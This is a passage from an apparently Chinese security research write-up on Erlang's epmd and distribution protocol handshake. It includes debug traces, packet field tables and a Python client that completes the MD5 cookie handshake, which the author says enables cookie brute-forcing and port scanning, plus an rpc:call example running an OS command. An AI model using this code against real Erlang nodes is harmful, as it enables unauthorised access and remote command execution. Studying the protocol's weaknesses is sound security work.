-d启动epmd的调试模式：
    // epmd_srv.c - print16:
    ...
    print16(s->buf,s->got);
    do_request(g, s->fd, s, s->buf + 2, s->got - 2);
    ...
    static int print16(char * s,unsigned int size){
      int i = 0;
      int count = 0;
      for(i = 0;i  16){
          count = 0;
        }
        printf("%x ",s[i]);
        count++;
      }
      printf("\n");
      return 0;
    }
②使用`erl -sname test` 在主机A重新启动一个process，得到调试信息：
    invoke do_request
    0 11 78 ffffffa8 d 4d 0 0 6 0 5 0 4 74 65 73 74 0 0 
    epmd: Mon Sep  5 15:50:22 2022: ** got ALIVE2_REQ
    epmd: Mon Sep  5 15:50:22 2022: registering 'test:1662364223', port 43021
    epmd: Mon Sep  5 15:50:22 2022: type 77 proto 0 highvsn 6 lowvsn 5
    epmd: Mon Sep  5 15:50:22 2022: ** sent ALIVE2_RESP for "test"
③从主机B发起cookie错误的连接请求：
    %% 主机A  这句并不会得到调试信息，也就是说node的auth信息并不会通知epmd
    auth:set_cookie("654321").
    %% 主机B
    erl -sname test2
    auth:set_cookie("123456").
    net_adm:ping("PI:EMAIL").
得到debug信息，可以看到请求包并不包含认证信息，也就是说auth是直接在process之间进行的，epmd不负责认证
    invoke do_request
    0 5 7a 74 65 73 74   
    epmd: Mon Sep  5 15:55:14 2022: ** got PORT2_REQ
    epmd: Mon Sep  5 15:55:14 2022: ** sent PORT2_RESP (ok) for "test"
0 5 前两个字节为长度
7a 74 65 73 74即为z t e s t ，z是控制字符，请求name为test的process信息
# 四、erlang-distribution握手协议分析
process通信安全问题之前有人研究过：
先给结论：
1、erl默认生成的cookie是伪随机的，可以被爆破。
2、erl distribution protocol握手靠cookie保护，通信过程没有认证，且默认无tls，可被中间人攻击。
由于erlang otp（标准库，里面含分布式通信的代码）通信协议在变化，高版本OTP process并不能与低版本通信，erl-matter工程的测试代码在otp 25（最新版本）下没有测试成功。
以下结合[官方文档](https://www.erlang.org/doc/apps/erts/erl_dist_protocol.html)对通信细节的描述和wireshark的抓包结果复现一下握手过程
（为了方便阅读，这里提供一个我的[翻译版](\[erl-matter/\[翻译\]erlang分发协议-erl distribution
protocal（OTP 25）.pdf at master · lxraa/erl-matter ·
GitHub\]\(https://github.com/lxraa/erl-matter/blob/master/otp25/%5B%E7%BF%BB%E8%AF%91%5Derlang%E5%88%86%E5%8F%91%E5%8D%8F%E8%AE%AE-erl%20distribution%20protocal%EF%BC%88OTP%2025%EF%BC%89.pdf\))，握手在13.2 章）
实验机器：
hostname | ip | system_type | 别名  
---|---|---|---  
PPC2LXR | 192.168.245.1 | WINDOWS | machine1  
localcentos1 | 192.168.245.128 | linux | machine2  
python3代码：
见本章末
1、windows和linux重新开启process后执行以下命令，使用wireshark抓到握手包
    net_adm:ping('test@localcentos1').
2、握手第一步，machine1向machine2发送：
字段名 | 长度 | 存储方式 | 说明  
---|---|---|---  
Length | 2bytes | 大端 | data的长度  
Tag | 1byte |  | 操作码，握手时为'N'  
Flags | 8bytes |  | 见文档  
Creation | 4bytes | 大端 |
节点A标记自己pid、ports和references的标识符，由于是个标识符，编写代码时随机生成一个4bytes长的unsigned整数即可  
NameLength | 2bytes | 大端 | name的长度  
Name | NameLength |  | machine1节点的名称  
字段名 | 长度 | 存储方式 | 说明  
---|---|---|---  
Length | 2bytes | 大端 | data的长度  
Tag | 1byte |  | 操作码，成功时值为's'  
Status | 2bytes |  | 成功时值为ok  
3、握手第二步，machine2向machine1发送：
字段名 | 长度 | 存储方式 | 说明  
---|---|---|---  
Length | 2bytes | 大端 | data的长度  
Tag | 1byte |  | 值为'N'  
Flags | 8bytes |  | 见文档  
challenge | 4bytes | 大端 | machine2生成的32位随机数  
Creation | 4bytes | 大端 | 标识符  
NameLength | 2bytes | 大端 | name的长度  
Name | NameLength |  | machine2节点的名称  
4、握手第三步，machine1向machine2发送
字段名 | 长度 | 存储方式 | 说明  
---|---|---|---  
Length | 2bytes | 大端 | data的长度-2  
Tag | 1byte |  | 值为'r'  
Challenge | 4bytes | 大端 | machine1生成的32位随机数  
Digest | 16bytes |  | md5(cookie+machine2_challenge)  
digest代码在`otp_src/lib/kernel/src/dist_util.erl`，注意转换成python代码的写法（见本章末代码）
machine2向machine1发送
字段名 | 长度 | 存储方式 | 说明  
---|---|---|---  
Length | 2bytes | 大端 | data的长度-2  
Tag | 1byte |  | 值为'a'  
Digest | 16bytes |  | md5(cookie+machine1_challenge)，互相通信，所以需要互相校验  
最终得到完整的代码：
    class Erldp:
        def __init__(self,host:string,port:int,cookie:bytes,cmd:string):
            self.host = host
            self.port = port
            self.cookie = cookie
            self.cmd = cmd
        def setCookie(self,cookie:bytes):
            self.cookie = cookie
        def _connect(self):
            self.sock = socket(AF_INET,SOCK_STREAM,0)
            self.sock.settimeout(1)
            assert(self.sock)
            self.sock.connect((self.host,self.port))
        def rand_id(self,n=6):
            return ''.join([choice(ascii_uppercase) for c in range(n)]) + '@nowhere'
        # 注意，这里的challenge是str.encode(str(int.from_bytes(challenge,"big")))
        def getDigest(self,cookie:bytes,challenge:int):
            challenge = str.encode(str(challenge))
            m = md5()
            m.update(cookie)
            m.update(challenge)
            return m.digest()
        def getRandom(self):
            r = int(random() * (2**32))
            return int.to_bytes(r,4,"big")
        def isErlDp(self):
            try:
                self._connect()
            except:
                print("[!]%s:%s tcp连接失败" % (self.host,self.port))
                return False
            try:
                self._handshake_step1()
            except:
                print("[!]%s:%s不是erldp" % (self.host,self.port))
                return False
            print("[*]%s:%s是erldp" % (self.host,self.port))
            return True
        def _handshake_step1(self):
            self.name = self.rand_id()
            packet = pack('!Hc8s4sH', 1+8+4+2+len(self.name), b'N', b"\x00\x00\x00\x01\x03\xdf\x7f\xbd",b"\x63\x15\x95\x8c", len(self.name)) + str.encode(self.name)
            self.sock.sendall(packet)
            (res_packet_len,) = unpack(">H",self.sock.recv(2))
            (tag,status) = unpack("1s2s",self.sock.recv(res_packet_len))
            assert(tag == b"s")
            assert(status == b"ok")
            print("step1 end:发送node1 name成功")
        def _handshake_step2(self):
            (res_packet_len,) = unpack(">H",self.sock.recv(2))
            data = self.sock.recv(res_packet_len)
            tag = data[0:1]
            flags = data[1:9]
            self.node2_challenge = int.from_bytes(data[9:13],"big")
            node2_creation = data[13:17]
            node2_name_len = int.from_bytes(data[17:19],"big")
            self.node2_name = data[19:]
            assert(tag == b"N")
            print("step2 end:接收node2 name成功")
        def _handshake_step3(self):
            node1_digest = self.getDigest(self.cookie,self.node2_challenge)
            self.node1_challenge = self.getRandom()
            packet2 = pack("!H1s4s16s",21,b"r",self.node1_challenge,node1_digest)
            self.sock.sendall(packet2)
            (res_packet_len,) = unpack(">H",self.sock.recv(2))
            (tag,node2_digest) = unpack("1s16s",self.sock.recv(res_packet_len))
            assert(tag == b"a")
            print("step3 end:验证md5成功，握手结束")
        def handshake(self):
            self._connect()
            self._handshake_step1()
            self._handshake_step2()
            self._handshake_step3()
            print("handshake done")
基于上述代码已经可以实现otp25口令爆破和端口扫描，已经能够满足需求。
默认口令的伪随机、中间人攻击、控制指令等原理见`github.com/gteissier/erl-matter`，如果编写用于OTP25的代码需要调整代码，例如`rpc:call('test@localcentos1','os','cmd',["touch
/tmp/tttt"])` 在otp25下使用了otp23新增的29号ctrl SPAWN_REQUEST（见pcap包和文档），而erl-matter中的`send_cmd`使用了6号指令REG_SEND，在otp25无法运行。
* * *